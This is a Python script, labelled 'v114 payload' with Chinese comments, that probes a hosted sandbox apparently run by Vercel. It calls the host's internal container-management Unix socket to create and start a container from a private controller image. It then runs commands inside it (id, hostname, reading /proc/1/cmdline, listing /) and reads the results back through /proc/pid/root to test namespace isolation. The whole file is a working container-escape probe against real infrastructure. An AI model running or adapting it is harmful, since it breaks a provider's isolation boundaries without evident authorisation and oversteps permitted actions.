# -*- coding: utf-8 -*-
"""v114 payload: /proc/pid/root 通道读取 exec 输出
P1 Create->Start->Exec(写文件+sleep)
P2 扫 /proc 找 exec 进程, 检查 ns + /proc/pid/root
P3 读 exec 进程写入的文件 (输出回传)
输出 /vercel/sandbox/v114c.out"""
import socket, struct, time, signal, json, os

OUT = '/vercel/sandbox/v114c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(220)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=2.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 500] if hdr_end > 0 else b''
        return status, payload
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def ps_snapshot():
    try:
        return set(int(x) for x in os.listdir('/proc') if x.isdigit())
    except Exception:
        return set()


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

log('=== P1 create-start-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)
if not cid:
    f.close()
    raise SystemExit

pids0 = ps_snapshot()
st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('START -> %s' % st)

cmd = ("echo EXEC_MARKER_$$ > /tmp/exec_marker.txt; id > /tmp/exec_id.txt; "
       "hostname > /tmp/exec_hn.txt; cat /proc/1/cmdline > /tmp/exec_p1.txt 2>&1; "
       "ls / > /tmp/exec_rootls.txt 2>&1; sleep 60")
st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                       json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', cmd]}}).encode(), t=5)
log('EXEC -> %s %r' % (st, pay[:200]))

# P2 扫新进程
log('=== P2 scan new pids ===')
newp = []
for _ in range(20):
    time.sleep(0.1)
    newp = sorted(ps_snapshot() - pids0)
    if newp:
        break
log('new pids: %s' % newp)
for p in newp:
    try:
        cmdline = open('/proc/%d/cmdline' % p, errors='replace').read().replace('\0', ' ')[:120]
    except Exception:
        cmdline = 'ERR'
    ns = {}
    for fld in ('pid', 'net', 'mnt', 'user'):
        try:
            ns[fld] = os.readlink('/proc/%d/ns/%s' % (p, fld))
        except Exception:
            ns[fld] = 'ERR'
    log('pid %d cmd=%r ns=%s' % (p, cmdline, ns))

# P3 读 exec 输出
log('=== P3 read exec outputs ===')
time.sleep(1)
for p in newp:
    for rel in ('/tmp/exec_marker.txt', '/tmp/exec_id.txt', '/tmp/exec_hn.txt', '/tmp/exec_p1.txt', '/tmp/exec_rootls.txt'):
        try:
            data = open('/proc/%d/root%s' % (p, rel)).read()[:300]
            log('pid %d %s -> %r' % (p, rel, data))
        except Exception as e:
            log('pid %d %s ERR %s' % (p, rel, type(e).__name__))

# 也检查容器主进程 (Start 后出现的新进程里的最老 pid)
for p in sorted(newp):
    try:
        for rel in ('/tmp/exec_marker.txt', '/etc/hostname', '/proc/1/cmdline'):
            data = open('/proc/%d/root%s' % (p, rel)).read()[:200]
            log('MAIN pid %d %s -> %r' % (p, rel, data))
            break
    except Exception:
        pass

# 清理
st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('KILL -> %s %r' % (st, pay[:100]))

log('V114C_DONE')
f.close()
